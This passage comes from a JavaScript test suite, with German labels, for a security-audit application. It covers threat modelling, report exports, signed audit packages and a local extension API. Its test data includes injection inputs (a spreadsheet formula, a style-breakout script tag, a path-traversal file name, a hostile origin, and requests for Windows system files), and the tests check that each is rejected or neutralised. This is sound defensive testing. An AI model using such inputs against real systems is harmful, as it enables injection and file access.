    check('zusammenfassung & bedrohungsmodell: im HTML- und Markdown-Bericht', /Kurzfassung des Laufs/.test(toHtml(repRes, {})) && /Bedrohungsmodell \(STRIDE\)/.test(toHtml(repRes, {})) && /## Zusammenfassung/.test(toMarkdown(repRes, {})) && /## Bedrohungsmodell \(STRIDE\)/.test(toMarkdown(repRes, {})));

    // STRIDE-Bedrohungsmodell
    providers.callProvider = async () => ({ text: JSON.stringify({ summary: 'Web-API mit Datenbank.', assets: ['Kundendaten'], entryPoints: ['/u/:id'], threats: [{ stride: 'T', title: 'SQL-Injection über /u/:id', asset: 'Datenbank', description: 'x', likelihood: 'high', impact: 'high', mitigations: ['Parameter binden'], findings: [1, 99] }, { stride: 'X', title: 'ungültig' }, { stride: 'S', title: 'Session-Diebstahl', likelihood: 'egal', mitigations: [] }] }), usage: {} });
    const tm = await aifix.threatModel({ result: runRes, targets: ['C:/proj'], config: { provider: 'ollama', model: 'm', lang: 'en' } });
    check('bedrohungsmodell: STRIDE-Karten normalisiert, Befund-Verweise geprüft', tm.source === 'ai' && tm.threats.length === 2 && tm.threats[0].stride === 'S' && tm.threats[1].findings.length === 1 && tm.threats[1].findings[0].title === 'SQL-Injection' && tm.threats[0].likelihood === 'medium' && tm.threats[1].category === 'Tampering');
    providers.callProvider = async () => ({ text: 'kein JSON', usage: {} });
    const tm2 = await aifix.threatModel({ result: runRes, config: { provider: 'ollama', model: 'm', lang: 'de' } });
    check('bedrohungsmodell: unbrauchbare KI-Antwort -> aus Befunden abgeleitet', tm2.source === 'rules' && tm2.threats.some((t) => t.stride === 'T') && tm2.threats.some((t) => t.stride === 'I') && tm2.error);
    restore();

    // Budget
    const budget = require('../src/core/budget');
    const led = { entries: [] };
    budget.record(led, { kind: 'run', usd: 1.5, model: 'a' }, '2026-11-02T10:00:00Z');
    budget.record(led, { kind: 'ask', usd: 0.25 }, '2026-11-03T10:00:00Z');
    budget.record(led, { kind: 'run', usd: 9 }, '2026-10-20T10:00:00Z');
    budget.record(led, { kind: 'run', usd: 0 }, '2026-11-03T10:00:00Z');
    const bs = budget.stats(led, 2, '2026-11-05T00:00:00Z');
    check('budget: Ausgaben je Monat und je Lauf', bs.month === '2026-11' && bs.spent === 1.75 && bs.runs === 1 && bs.calls === 1 && bs.remaining === 0.25 && !bs.exceeded && bs.months.length === 2 && bs.avgRunUsd === 1.5);
    const bc = budget.check(led, 2, 0.5, '2026-11-05T00:00:00Z');
    check('budget: würde überschritten -> Rückfrage nötig', !bc.ok && bc.wouldExceed);
    budget.record(led, { kind: 'run', usd: 0.5 }, '2026-11-04T10:00:00Z');
    check('budget: erreicht -> gesperrt, ohne Budget nie gesperrt', budget.stats(led, 2, '2026-11-05T00:00:00Z').exceeded && budget.check(led, 0, 100).ok);

    // Hardware & lokales Modell
    const hw = require('../src/core/hwdetect');
    check('hardware: nvidia-smi wird gelesen', hw.parseNvidiaSmi('NVIDIA GeForce RTX 4090, 24564\n')[0].vramGB === 24);
    const ps = hw.parsePsJson(JSON.stringify({ video: [{ Name: 'AMD Radeon RX 7800 XT', AdapterRAM: 4293918720 }, { Name: 'Microsoft Basic Display Adapter', AdapterRAM: 0 }], reg: [{ DriverDesc: 'AMD Radeon RX 7800 XT', 'HardwareInformation.qwMemorySize': 17163091968 }] }));
    check('hardware: Grafikspeicher aus der Registry statt des 4-GB-Felds', ps.length === 1 && ps[0].vramGB === 16 && ps[0].vendor === 'amd');
    check('hardware: wmic-Fallback', hw.parseWmicCsv('Node,AdapterRAM,Name\nPC,8589934592,NVIDIA GeForce RTX 3070\n')[0].vramGB === 8);
    const fake = (out) => async (cmd) => (cmd === 'nvidia-smi' ? out : '');
    const h24 = await hw.detectHardware({ exec: fake('NVIDIA GeForce RTX 4090, 24564'), platform: 'linux', totalmem: 64 * 1024 ** 3, cpus: 16 });
    check('hardware: 24 GB Grafikspeicher -> 32B-Modell', hw.recommendModel(h24).name === 'qwen2.5-coder:32b' && hw.recommendModel(h24).mode === 'gpu');
    check('hardware: 8 GB Grafikspeicher -> 7B, installiertes passendes Modell bevorzugt', hw.recommendModel({ ramGB: 16, gpus: [{ name: 'RTX 3070', vendor: 'nvidia', vramGB: 8 }] }, ['llama3.1:8b', 'qwen2.5-coder:3b']).name === 'qwen2.5-coder:7b' && hw.recommendModel({ ramGB: 16, gpus: [{ name: 'RTX 3070', vendor: 'nvidia', vramGB: 8 }] }, ['llama3.1:8b', 'qwen2.5-coder:3b']).installedChoice === 'qwen2.5-coder:3b');
    check('hardware: ohne Grafikkarte 8 GB RAM -> kleines Modell auf dem Prozessor', hw.recommendModel({ ramGB: 8, gpus: [{ name: 'Intel UHD', vendor: 'intel', vramGB: 1 }] }).name === 'qwen2.5-coder:3b' && hw.recommendModel({ ramGB: 8, gpus: [] }).mode === 'cpu');

    // Upgrade-Hinweise
    const up = require('../src/core/upgrade');
    check('upgrade: semver-Sprünge erkannt', up.semverJump('4.17.20', '5.0.0').breaking && up.semverJump('0.3.1', '0.4.0').breaking && !up.semverJump('1.2.3', '1.4.0').breaking && up.semverJump('1.2.3', '1.2.9').kind === 'patch' && up.semverJump('x', '1').kind === 'unknown');
    const fakeReg = async (url) => {
      if (url.startsWith('https://registry.npmjs.org/')) return fakeRes({ repository: { url: 'git+https://github.com/acme/lib.git' }, homepage: 'https://acme.dev' });
      if (url.startsWith('https://api.github.com/repos/acme/lib/releases')) return fakeRes([{ tag_name: 'v5.0.0', html_url: 'https://github.com/acme/lib/releases/tag/v5.0.0', body: '## Changes\n- BREAKING CHANGE: removed the callback API\n- faster' }, { tag_name: 'v4.17.21', html_url: 'https://github.com/acme/lib/releases/tag/v4.17.21', body: '- fix' }, { tag_name: 'v4.0.0', body: 'old' }]);
      return fakeRes({}, 404);
    };
    let upPrompt = '';
    const ug = await up.upgradeGuide({ pkg: { ecosystem: 'npm', name: 'acme-lib', version: '4.17.20', fixed: '5.0.0' }, config: { provider: 'ollama', lang: 'en' }, fetchImpl: fakeReg, aiCall: async (_c, m) => { upPrompt = m.user; return { text: '- **Callback API removed** – switch to promises.', cost: { usd: 0 } }; } });
    check('upgrade: Changelog-/Release-Links aus den Registry-Metadaten', ug.links.some((l) => l.url === 'https://github.com/acme/lib/releases') && ug.links.some((l) => /compare\/v4\.17\.20\.\.\.v5\.0\.0$/.test(l.url)) && ug.jump.kind === 'major');
    check('upgrade: brechende Änderungen aus den Release Notes, KI-Zusammenfassung', ug.hints.length === 1 && /callback API/.test(ug.hints[0].text) && /Callback API removed/.test(ug.aiSummary) && /v5\.0\.0/.test(upPrompt) && !/v4\.0\.0/.test(upPrompt));
    const ug2 = await up.upgradeGuide({ pkg: { ecosystem: 'pypi', name: 'x', version: '1.0', fixed: '1.1' }, fetchImpl: async () => fakeRes({}, 500) });
    check('upgrade: Registry nicht erreichbar -> trotzdem Ergebnis mit Hinweis', ug2.ok && ug2.error && ug2.jump.kind === 'minor' && !ug2.aiSummary);

    // Befristete Risikoakzeptanz
    const st2 = require('../src/core/store');
    const db2 = st2.emptyStore();
    const ap = st2.applyRun(db2, { targets: [{ type: 'path', value: 'C:/q' }], findings: [{ ruleId: 'r1', title: 'A', location: 'q/a.js:1', category: 'Config', severity: 'medium', source: 'prescan' }, { ruleId: 'r2', title: 'B', location: 'q/b.js:1', category: 'Config', severity: 'low', source: 'prescan' }], scannersRun: [], now: '2026-01-01T00:00:00Z' });
    const [ida, idb] = ap.findings.map((f) => f.id);
    const sa = st2.setStatus(db2, ida, 'ACCEPTED_RISK', 'intern', { now: '2026-01-01T00:00:00Z' });
    st2.setStatus(db2, idb, 'ACCEPTED_RISK', '', { now: '2026-01-01T00:00:00Z', expiresInDays: 365 });
    check('ablauf: Risiko akzeptiert gilt standardmäßig 90 Tage', sa.ok && sa.finding.acceptedUntil === '2026-04-01T00:00:00.000Z');
    const ex = st2.expireAcceptedRisks(db2, '2026-04-02T00:00:00Z');
    check('ablauf: abgelaufen -> wieder offen mit Hinweis, längere Frist bleibt', ex.expired === 1 && db2.findings[ida].status === 'OPEN' && /abgelaufen/.test(db2.findings[ida].statusNote) && db2.findings[idb].status === 'ACCEPTED_RISK');
    st2.setStatus(db2, idb, 'IN_PROGRESS');
    check('ablauf: anderer Status entfernt die Frist', !db2.findings[idb].acceptedUntil);
    const { StatusUpdateSchema } = require('../src/core/validation');
    check('ablauf: Frist wird validiert', StatusUpdateSchema.safeParse({ status: 'ACCEPTED_RISK', expiresInDays: 30 }).success && !StatusUpdateSchema.safeParse({ status: 'ACCEPTED_RISK', expiresInDays: 0 }).success);

    // Nachschlage-Werkzeuge ueber die Units
    const { makeLookupTools } = require('../src/core/lookup');
    const lt = makeLookupTools(aUnits);
    check('nachschlagen: Datei nur aus dem geprüften Material', /nicht Teil/.test(await lt.run('read_file', { path: 'C:/Windows/win.ini' })) && /getUser/.test(await lt.run('read_file', { path: 'lib/db' })));
    check('nachschlagen: Definition wird gefunden', /proj\/lib\/db\.js Zeilen 2-/.test(await lt.run('find_definition', { name: 'getUser' })));

    // Englische Fassungen der neuen Texte
    const i18n = require('../src/core/findings-i18n');
    check('englisch: neue Hinweise und Notizen übersetzt', /^Risk acceptance expired on 2026-04-01/.test(i18n.translate('Risikoakzeptanz am 2026-04-01 abgelaufen – wieder offen. Bitte neu bewerten.')) && /^Budget: only the 5 most relevant of 9 files/.test(i18n.translate('Budget: nur die 5 relevantesten von 9 Dateien gingen an die KI – 4 weniger relevante übersprungen (z. B. a.js).')));
    restore();
  }

  // --- Berichte, Exporte, Signatur, Vergleich, Notizen, Rueckgaengig, Pause, Browser-Eingang ---
  {
    const path = require('path');
    const AdmZip = require('adm-zip');
    const X = require('../src/core/exports');
    const S = require('../src/core/signing');
    const C = require('../src/core/compare');
    const { complianceReport } = require('../src/core/taxonomy');
    const { toHtml, toMarkdown } = require('../src/core/reportdoc');
    const { toExecutive } = require('../src/core/report');
    const { localizeReportHtml } = require('../src/core/report-en');
    const res = { findings: [
      { id: 'f1', title: 'SQL aus Eingabe', severity: 'critical', category: 'Injection', location: 'src/db.js:12', ruleId: 'sql-concat', cwe: 'CWE-89', owasp: 'A03', note: 'Mit dem Team besprochen' },
      { id: 'f2', title: 'lodash@4.17.11', severity: 'high', category: 'Dependencies', location: 'package.json', ruleId: 'CVE-2019-10744', owasp: 'A06', inCisaKev: true, status: 'FALSE_POSITIVE', statusNote: 'Betroffene Funktion wird nie aufgerufen' },
      { id: 'f3', title: '=HYPERLINK("x") <b>&', severity: 'low', category: 'Config', location: 'app/conf.yml:3', ruleId: 'cfg-x', owasp: 'A05', status: 'ACCEPTED_RISK', statusNote: 'Nur intern erreichbar' },
      { id: 'f4', title: 'Veraltetes Paket', severity: 'medium', category: 'Dependencies', location: 'package.json', ruleId: 'GHSA-xxxx-yyyy', owasp: 'A06', inCisaKev: true },
    ], summary: {}, meta: { at: '2026-11-05T10:00:00Z' } };

    // Normen: neue Kataloge und Auswahl
    const comp = complianceReport(res.findings);
    const cra = comp.find((c) => c.key === 'cra');
    check('cra: Anhang I mit KEV- und Update-Anforderungen', !!cra && cra.controls.find((k) => k.id === 'Teil I (2) a').count === 1 && cra.controls.find((k) => k.id === 'Teil II (2)').count === 1);
    check('normen: SOC 2, PCI DSS, ASVS, HIPAA mit Treffern', ['soc2', 'pcidss', 'asvs', 'hipaa'].every((k) => comp.find((c) => c.key === k).controls.some((x) => x.count)));
    check('normen: Auswahl einzelner Kataloge', complianceReport(res.findings, ['cra', 'hipaa']).map((c) => c.key).join() === 'cra,hipaa');

    // Branding und Notizen im Bericht
    const html = toHtml(res, { accent: '#123abc', coverText: 'Im Auftrag der Muster GmbH', footerText: 'Vertraulich – nur intern', frameworks: ['cra'] });
    check('branding: Akzentfarbe, Deckblatt-Text und Fusszeile im HTML-Bericht', html.includes('--accent:#123abc') && html.includes('Im Auftrag der Muster GmbH') && html.includes('Vertraulich – nur intern'));
    check('branding: ungültige Farbe wird verworfen', toHtml(res, { accent: 'red;}</style><script>' }).includes('--accent:#b7791f') && !toHtml(res, { accent: 'red;}</style><script>' }).includes('red;}'));
    check('bericht: nur gewählte Normen, Notiz im Befund', html.includes('EU Cyber Resilience Act') && !html.includes('ISO/IEC 27001') && html.includes('Mit dem Team besprochen'));
    check('bericht (Markdown): Notiz, Deckblatt-Text und Fusszeile', (() => { const md = toMarkdown(res, { coverText: 'Deckblatt X', footerText: 'Fuss Y' }); return md.includes('**Notiz:** Mit dem Team besprochen') && md.includes('Deckblatt X') && md.trim().endsWith('Fuss Y'); })());
    check('kurzbericht: Branding angewandt', (() => { const h = toExecutive(res, { accent: '#00aa00', coverText: 'Hallo Vorstand', footerText: 'Fuss Z' }); return h.includes('#00aa00') && h.includes('Hallo Vorstand') && h.includes('Fuss Z'); })());
    check('englisch: neue Normen im Bericht übersetzt', (() => { const en = localizeReportHtml(toHtml(res, { frameworks: ['cra', 'hipaa'] })); return en.includes('EU Cyber Resilience Act – Annex I') && en.includes('Part I (2) a') && en.includes('Transmission security') && !en.includes('Begrenzung der Angriffsfläche'); })());

    // CSV / Excel / Word
    const csv = X.toCsv(res, { lang: 'en' });
    check('csv: BOM, englische Kopfzeile, nur offene Befunde, Notiz', csv.charCodeAt(0) === 0xfeff && /^\uFEFFNo\.,Severity,Finding/.test(csv) && csv.includes('Mit dem Team besprochen') && !csv.includes('lodash'));
    check('csv: Formeln aus Befundtexten entschärft', X.toCsv(res, { all: true }).includes('"\'=HYPERLINK(""x"") <b>&"'));
    const xz = new AdmZip(X.toXlsx(res, { lang: 'en' }));
    const sheet = xz.readAsText('xl/worksheets/sheet1.xml');
    check('excel: gültige OOXML-Struktur mit zwei Blättern', ['[Content_Types].xml', '_rels/.rels', 'xl/workbook.xml', 'xl/styles.xml', 'xl/worksheets/sheet2.xml'].every((n) => xz.getEntry(n)) && /<sheet name="Findings"/.test(xz.readAsText('xl/workbook.xml')));
    check('excel: Text als Inline-Strings, Kopfzeile fixiert, Filter', sheet.includes('t="inlineStr"') && sheet.includes('state="frozen"') && sheet.includes('<autoFilter ref="A1:O3"/>') && sheet.includes('SQL aus Eingabe'));
    check('excel: Sonderzeichen XML-maskiert', !/<t[^>]*>[^<]*&(?!amp;|lt;|gt;|quot;|apos;)/.test(new AdmZip(X.toXlsx(res, { all: true })).readAsText('xl/worksheets/sheet1.xml')));
    const dz = new AdmZip(X.toDocx(res, { lang: 'en', title: 'Security report', footerText: 'Internal' }));
    const doc = dz.readAsText('word/document.xml');
    check('word: Dokument mit Überschriften, Tabellen und Fusszeile', ['word/styles.xml', 'word/footer1.xml', 'docProps/core.xml'].every((n) => dz.getEntry(n)) && doc.includes('w:val="Heading1"') && doc.includes('<w:tbl>') && dz.readAsText('word/footer1.xml').includes('Internal'));
    check('word: englische Beschriftungen und Befundtexte', doc.includes('Findings in detail') && doc.includes('What the levels mean') && !doc.includes('Befunde im Detail') && doc.includes('SQL aus Eingabe'));
    check('word: deutsch auf Wunsch', new AdmZip(X.toDocx(res, { lang: 'de' })).readAsText('word/document.xml').includes('Befunde im Detail'));

    // VEX
    const vex = JSON.parse(X.toOpenVex(res, { company: 'Muster GmbH' }));
    const st = vex.statements;
    check('openvex: nur Fehlalarm/akzeptiert, Kontext und Autor', vex['@context'] === 'https://openvex.dev/ns/v0.2.0' && vex.author === 'Muster GmbH' && st.length === 2);
    check('openvex: Fehlalarm = not_affected mit Begründung aus der Notiz', st[0].status === 'not_affected' && st[0].justification === 'vulnerable_code_not_in_execute_path' && st[0].impact_statement.includes('nie aufgerufen') && st[0].vulnerability.name === 'CVE-2019-10744' && st[0].products[0]['@id'] === 'pkg:npm/lodash@4.17.11');
    check('openvex: akzeptiertes Risiko = affected mit action_statement', st[1].status === 'affected' && /Risk accepted: Nur intern/.test(st[1].action_statement));
    const cdx = JSON.parse(X.toCycloneDxVex(res));
    check('cyclonedx-vex: Analyse-Status und Komponenten', cdx.bomFormat === 'CycloneDX' && cdx.specVersion === '1.5' && cdx.vulnerabilities[0].analysis.state === 'false_positive' && cdx.vulnerabilities[0].analysis.justification === 'code_not_reachable' && cdx.vulnerabilities[1].analysis.response[0] === 'will_not_fix' && cdx.components.some((c) => c.purl === 'pkg:npm/lodash@4.17.11'));
    check('vex: Begründungen aus Notizen', X.justification('durch WAF abgesichert').openvex === 'inline_mitigations_already_exist' && X.justification('nur Testdaten').cdx === 'code_not_present');
    check('sbom: CycloneDX mit purl und ohne Doppelte', JSON.parse(X.toCycloneDxSbom([{ ecosystem: 'npm', name: '@scope/a', version: '1.0.0' }, { ecosystem: 'npm', name: '@scope/a', version: '1.0.0' }, { ecosystem: 'PyPI', name: 'requests', version: '2.0' }])).components.map((c) => c.purl).join() === 'pkg:npm/%40scope/a@1.0.0,pkg:pypi/requests@2.0');

    // Abzeichen
    const svg = X.badgeSvg({ grade: 'B', date: '2026-11-05' });
    check('abzeichen: SVG mit Note, Datum und Farbe', /^<svg[^>]+width="\d+" height="20"/.test(svg) && svg.includes('B · 2026-11-05') && svg.includes('#4c9a2a') && svg.includes('role="img"'));
    check('abzeichen: Markdown-Schnipsel', X.badgeMarkdown('my badge.svg', { grade: 'B', date: '2026-11-05' }) === '![Vigil security: B (2026-11-05)](my%20badge.svg)');

    // CI-Formate
    const gl = JSON.parse(X.toGitlabSast(res, '1.2.3'));
    const v0 = gl.vulnerabilities[0];
    check('gitlab sast: Schema-Felder, nur offene Befunde', gl.scan.type === 'sast' && gl.scan.analyzer.version === '1.2.3' && gl.vulnerabilities.length === 2 && v0.severity === 'Critical' && v0.location.file === 'src/db.js' && v0.location.start_line === 12);
    check('gitlab sast: UUID und Kennungen (CWE)', /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-a[0-9a-f]{3}-[0-9a-f]{12}$/.test(v0.id) && v0.identifiers.some((i) => i.type === 'cwe' && i.value === '89'));
    const ju = X.toJunit(res);
    check('junit: testsuite mit error/failure je Schwere', /<testsuites name="Vigil" tests="2" failures="1" errors="1">/.test(ju) && ju.includes('<error type="critical"') && ju.includes('<failure type="medium"'));
    check('junit: ohne Befunde ein bestandener Test', /tests="1" failures="0" errors="0"/.test(X.toJunit({ findings: [] })));
    const cs = X.toCheckstyle({ findings: [{ title: 'A <b> & "c"', severity: 'high', location: 'x.js:4', ruleId: 'r1' }, { title: 'B', severity: 'low', location: 'x.js:9' }] });
    check('checkstyle: Datei-Gruppen, Zeilen, Schwere, maskiert', (cs.match(/<file /g) || []).length === 1 && cs.includes('line="4" severity="error" message="A &lt;b&gt; &amp; &quot;c&quot;"') && cs.includes('severity="info"'));
    const cli = require('child_process').spawnSync(process.execPath, [path.join(__dirname, '..', 'src', 'cli.js'), '--format', 'bogus', 'x'], { encoding: 'utf8' });
    check('cli: unbekanntes --format wird sofort abgelehnt', cli.status === 1 && /gitlab, junit, checkstyle/.test(cli.stderr));

    // Signatur und Audit-Paket
    const keys = S.generateKeyPair();
    const other = S.generateKeyPair();
    const pkg = S.buildAuditPackage([{ name: 'report.html', data: '<p>x</p>' }, { name: 'report.pdf', data: Buffer.from([1, 2, 3]) }, { name: 'sbom.cdx.json', data: '{}' }], keys);
    const pz = new AdmZip(pkg);
    check('audit-paket: Dateien, Manifest, SHA256SUMS, Signatur', ['report.html', 'report.pdf', 'sbom.cdx.json', 'manifest.json', 'SHA256SUMS', 'manifest.sig.json'].every((n) => pz.getEntry(n)) && pz.readAsText('SHA256SUMS').includes('  report.pdf'));
    const ok = S.verifyAuditPackage(pkg, keys.publicKeyPem);
    check('audit-paket: Prüfung gültig mit eigenem Schlüssel', ok.ok && ok.signatureValid && ok.trusted && ok.files.length === 3);
    check('audit-paket: fremder Schlüssel gültig, aber nicht vertraut', (() => { const r = S.verifyAuditPackage(pkg, other.publicKeyPem); return r.ok && !r.trusted; })());
    check('audit-paket: veränderte Datei wird erkannt', (() => { const z = new AdmZip(pkg); z.updateFile('report.html', Buffer.from('<p>y</p>')); const r = S.verifyAuditPackage(z.toBuffer(), keys.publicKeyPem); return !r.ok && r.errors.some((e) => /verändert: report.html/.test(e)); })());
    check('audit-paket: verändertes Manifest bricht die Signatur', (() => { const z = new AdmZip(pkg); const sig = JSON.parse(z.readAsText('manifest.sig.json')); sig.manifest.files[0].sha256 = '0'.repeat(64); z.updateFile('manifest.sig.json', Buffer.from(JSON.stringify(sig))); return !S.verifyAuditPackage(z.toBuffer(), keys.publicKeyPem).signatureValid; })());
    check('audit-paket: ohne Signatur nur Prüfsummen', (() => { const r = S.verifyAuditPackage(S.buildAuditPackage([{ name: 'a.txt', data: 'a' }], null)); return r.ok && r.signed === false; })());
    const sf = JSON.parse(S.signFile('bericht.pdf', Buffer.from('PDF'), keys));
    check('signatur: Einzeldatei prüfen und Manipulation erkennen', S.verifySigned(sf, new Map([['bericht.pdf', Buffer.from('PDF')]]), keys.publicKeyPem).ok && !S.verifySigned(sf, new Map([['bericht.pdf', Buffer.from('PDX')]]), keys.publicKeyPem).ok && !S.verifySigned({}, new Map()).ok);
    check('signatur: kanonisches JSON unabhängig von der Reihenfolge', S.canonical({ b: 1, a: [2, { d: 1, c: 2 }] }) === S.canonical({ a: [2, { c: 2, d: 1 }], b: 1 }));
    check('signatur: Pfade im Paket bereinigt', JSON.parse(new AdmZip(S.buildAuditPackage([{ name: '../../evil.txt', data: 'x' }], null)).readAsText('manifest.json')).files[0].name === 'evil.txt');

    // Vergleich zweier Laeufe
    const d = C.diffResults({ findings: [{ id: 'a', title: 'Bleibt', severity: 'medium' }, { id: 'b', title: 'Weg', severity: 'high' }, { id: 'c', title: 'Fehlalarm', severity: 'high', status: 'FALSE_POSITIVE' }] },
      { findings: [{ id: 'a', title: 'Bleibt', severity: 'high' }, { id: 'n', title: 'Neu dazu', severity: 'critical' }, { title: 'Ohne ID', ruleId: 'r', location: 'x', severity: 'low' }] });
    check('vergleich: neu / behoben / unverändert', d.added.map((f) => f.title).join() === 'Neu dazu,Ohne ID' && d.fixed.map((f) => f.title).join() === 'Weg' && d.unchanged.length === 1 && d.unchanged[0].previousSeverity === 'medium' && d.totals.before === 2);
    const ch = localizeReportHtml(C.toCompareHtml(d, { a: { at: '2026-11-01T10:00:00Z', targets: ['app'] }, b: { at: '2026-11-02T10:00:00Z' } }));
    check('vergleich: Bericht (HTML) englisch mit drei Spalten', ch.includes('Comparison of two scans') && ch.includes('>New ') && ch.includes('>Unchanged ') && !ch.includes('Vorher:'));
    check('vergleich: Markdown mit Tabellen', /## Behoben[\s\S]*\| Hoch \| Weg \|/.test(C.toCompareMarkdown(d, {})));

    // Speicher: Notizen und Papierkorb
    const store = require('../src/core/store');
    const db = store.emptyStore();
    const t1 = { type: 'path', value: 'C:/proj' };
    const f0 = { title: 'Secret', severity: 'high', category: 'Secrets', location: 'a.js:1', ruleId: 'aws-key', source: 'prescan' };
    const r1 = store.applyRun(db, { targets: [t1], findings: [f0], scannersRun: [] });
    const fid = r1.findings[0].id;
    check('notiz: speichern, kürzen, entfernen', store.setNote(db, fid, '  Hallo  ').note === 'Hallo' && db.findings[fid].note === 'Hallo' && store.setNote(db, fid, 'x'.repeat(5000)).note.length === 4000 && store.setNote(db, fid, '').note === '' && !('note' in db.findings[fid]) && !store.setNote(db, 'nope', 'x').ok);
    store.setNote(db, fid, 'Bleibt erhalten');
    const r2 = store.applyRun(db, { targets: [t1], findings: [f0], scannersRun: [] });
    check('notiz: bleibt über weitere Läufe erhalten und steht im Ergebnis', db.findings[fid].note === 'Bleibt erhalten' && r2.findings[0].note === 'Bleibt erhalten');
    const del = store.softDeleteFindings(db, [fid], 1000);
    check('rückgängig: Befund gelöscht, Token vorhanden', del.deleted === 1 && !db.findings[fid] && /^[a-f0-9]{18}$/.test(del.undoToken));
    check('rückgängig: Befund wiederhergestellt', store.restoreTrash(db, del.undoToken).ok && db.findings[fid].note === 'Bleibt erhalten' && !store.restoreTrash(db, del.undoToken).ok);
    const tid = r1.targetIds[0];
    store.addRun(db, { id: 'run-1', status: 'COMPLETED', targetIds: [tid], targets: [] });
    store.addRun(db, { id: 'run-2', status: 'COMPLETED', targetIds: [], targets: [] });
    const dt = store.softDeleteTarget(db, tid, 1000);
    check('rückgängig: Ziel mit Befunden gelöscht und zurückgeholt', dt.ok && !db.targets[tid] && !db.findings[fid] && store.restoreTrash(db, dt.undoToken).ok && !!db.targets[tid] && !!db.findings[fid] && db.runs.find((r) => r.id === 'run-1').targetIds.includes(tid));
    const dr = store.softDeleteRun(db, 'run-2', 1000);
    check('rückgängig: Lauf an alter Stelle wiederhergestellt', dr.ok && db.runs.length === 1 && store.restoreTrash(db, dr.undoToken).ok && db.runs[0].id === 'run-2');
    const late = store.softDeleteFindings(db, [fid], 1000);
    check('rückgängig: nach Ablauf der Frist endgültig gelöscht', store.purgeTrash(db, store.UNDO_MS, 1000 + store.UNDO_MS + 1) === 1 && !store.restoreTrash(db, late.undoToken).ok && !db.findings[fid]);

    // Orchestrator: Pause zwischen Haltepunkten
    const os = require('os'); const fs = require('fs');
    const { createOrchestrator } = require('../electron/orchestrator');
    const steps = [];
    const orch = createOrchestrator({ storeFile: path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-pause-')), 's.json'), buildConfig: () => ({}),
      runAudit: async (targets, cfg) => { for (let i = 0; i < 3; i++) { await cfg.checkpoint(); steps.push(i); await new Promise((r) => setTimeout(r, 15)); } return { result: { findings: [], summary: { total: 0, counts: {} }, errors: [], meta: {} } }; } });
    const job = orch.enqueue({ targets: [{ type: 'path', value: 'C:/x' }], origin: 'app' });
    await new Promise((r) => setTimeout(r, 5));
    const paused = orch.pause();
    await new Promise((r) => setTimeout(r, 80));
    const heldAt = steps.length;
    check('pause: Lauf hält am nächsten Haltepunkt', paused && orch.isPaused() && heldAt === 1 && !orch.pause());
    check('pause: Fortsetzen läuft zu Ende', orch.resume() && !orch.isPaused() && (await job.done).ok && steps.length === 3 && !orch.resume());
    const job2 = orch.enqueue({ targets: [{ type: 'path', value: 'C:/x' }], origin: 'app' });
    await new Promise((r) => setTimeout(r, 5)); orch.pause(); orch.cancel();
    const out2 = await Promise.race([job2.done, new Promise((r) => setTimeout(() => r(null), 1500))]);
    check('pause: Abbrechen löst eine Pause', !!out2 && out2.canceled === true && !orch.isPaused());

    // Code-Kommentare in Loesungen (englische Oberflaeche)
    const i18n = require('../src/core/findings-i18n');
    check('kommentare: Code-Kommentare übersetzt, Code bleibt', i18n.translateCode('# versteckte Dateien und SourceMaps sperren\nlocation ~ /x { deny all; }\nel.textContent = v; // statt innerHTML\ncolor: #fff;') === '# block hidden files and source maps\nlocation ~ /x { deny all; }\nel.textContent = v; // instead of innerHTML\ncolor: #fff;');
    const { KB } = require('../src/core/remedies');
    const GER = /[äöüßÄÖÜ]|\b(der|die|das|und|nicht|ist|mit|für|oder|wird|auf|eine?|zu|von|bei|nach|aus|nur|statt|sperren|prüfen|entfernen|aktiv|bzw|keine?|löschen)\b/;
    const comments = [];
    const scan = (code) => String(code || '').split('\n').forEach((l) => { const m = /^\s*(?:\/\/|#|--|;)\s?(.*)$/.exec(l) || /\s(?:\/\/|#)\s?([^'"`]*)$/.exec(l); if (m && GER.test(m[1])) comments.push(m[1]); });
    const walk = (o) => { if (!o || typeof o !== 'object') return; const lf = i18n.localizeFinding({ snippets: o.snippets, patch: o.patch }); if (o.snippets) Object.values(lf.snippets).forEach(scan); if (o.patch) scan(lf.patch); for (const v of Object.values(o)) if (v && typeof v === 'object' && v !== o.snippets) walk(v); };
    walk(KB);
    check('kommentare: alle Kommentare in den Lösungs-Schnipseln übersetzt', comments.length === 0, comments.slice(0, 3).join(' | '));

    // REST-API: Eingang fuer die Browser-Erweiterung
    const http = require('http');
    const { createApi } = require('../electron/api');
    const inbox = [];
    const api = createApi({ orchestrator: { stats: () => ({}) }, getConfig: () => ({ apiToken: 'tok123', allowlist: [] }), enforceScope: () => ({ ok: false }), onInbox: (u) => inbox.push(u) });
    const started = await api.start(0);
    const call = (method, p, headers, body) => new Promise((resolve) => { const rq = http.request({ host: '127.0.0.1', port: started.port, path: p, method, headers }, (rs) => { let b = ''; rs.on('data', (c) => { b += c; }); rs.on('end', () => resolve({ status: rs.statusCode, body: b })); }); rq.on('error', () => resolve({ status: 0 })); if (body) rq.write(body); rq.end(); });
    const ext = { Origin: 'chrome-extension://abcdefghijklmnop', Authorization: 'Bearer tok123', 'Content-Type': 'application/json' };
    const a1 = await call('POST', '/api/inbox', ext, JSON.stringify({ url: 'https://shop.example.com/login?x=1' }));
    check('erweiterung: Adresse wird vorgemerkt (Bestätigung in der App)', a1.status === 202 && JSON.parse(a1.body).needsConfirmation === true && inbox[0] === 'https://shop.example.com/login');
    const a2 = await call('POST', '/api/inbox', { ...ext, Origin: 'https://evil.example' }, JSON.stringify({ url: 'https://x.example' }));
    const a3 = await call('POST', '/api/inbox', { ...ext, Authorization: 'Bearer falsch' }, JSON.stringify({ url: 'https://x.example' }));
    const a4 = await call('GET', '/api/stats', ext);
    const a5 = await call('POST', '/api/inbox', ext, JSON.stringify({ url: 'file:///C:/Windows' }));
    check('erweiterung: Webseiten, falsches Token, andere Endpunkte und Nicht-Web-Adressen abgelehnt', a2.status === 403 && a3.status === 401 && a4.status === 403 && a5.status === 400 && inbox.length === 1);
    await api.stop();
    const mf = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'extensions', 'browser', 'manifest.json'), 'utf8'));
    check('erweiterung: Manifest V3, nur 127.0.0.1', mf.manifest_version === 3 && mf.host_permissions.join() === 'http://127.0.0.1/*' && fs.existsSync(path.join(__dirname, '..', 'extensions', 'browser', mf.action.default_popup)));
  }

  // --- Code-Regeln: Frameworks, Sprachen, Konfigurationen, Daten, Modelle ---
  {
    const fs = require('fs');
    const os = require('os');
    const path = require('path');
